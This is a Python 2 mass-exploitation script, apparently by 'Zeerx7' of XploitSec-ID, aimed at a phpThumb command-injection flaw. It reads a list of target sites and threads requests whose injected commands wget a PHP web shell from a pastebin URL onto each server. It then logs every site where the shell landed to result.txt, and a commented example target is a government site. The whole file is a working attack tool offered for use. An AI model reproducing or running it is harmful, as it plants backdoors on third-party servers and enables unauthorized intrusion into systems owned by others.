import requests, re, sys, base64
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
Thread_ = 20 #Thread
exploit = 'lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;wget%20-O%20xxx.php%20https://pastebin.com/raw/JgDhgE0c;ls%20-la;cat%20xxx.php;%20&phpThumbDebug=9'
shell = '/lib/watermark/xxx.php'
def zeerx7():
   print(base64.decodestring('w5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cNCiBBdXRvIHVwbG9hZCBzaGVsbCBwaHBUaHVtYiBjb21tYW5kIGluamVjdGlvbg0KIENvZGVkIGJ5IFplZXJ4NyAtLS0tLS0tLS0tLS0tLS0gWHBsb2l0U2VjLUlEDQrDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlw=='))

def xsec(target):
   try:
     u = ceku(target)
     pausi = u+'/'+exploit
     r = requests.get(pausi)
     if 'Uploader by Zeerx7' in r.text:
         print("Vuln! [Shell Uploaded] "+u+shell)
	 fx = open("result.txt", "a")
	 fx.write(u+shell+"\n")
	 fx.close()
     else:
         print("Not Vuln "+u)
   except:
      print('error')

def main():
    xx = []
    l = list(sys.argv[1])
    for j in l:
      if j:
        xx.append(j)

    #print(xx)
    #f = ['http://pustaka.pn-calang.go.id']
    if xx:
        pool = ThreadPool(Thread_)
	pool.map(xsec, xx)
        pool.close()
	pool.join()
        #xsec(f[0])

def ceku(u):
   if 'http://' in u or 'https://' in u:
      pass
   else:
      u = 'http://'+u

   return u

def list(list):
   f=open(list,'r')
   kontent=f.read()
   return kontent.split('\n')

if __name__ == '__main__':
    zeerx7()
    try:
        if len(sys.argv) < 2:
 	    print("\nUsage : python2 run.py target.txt\n")
	else:
	    main()
    except:
        print('Error')
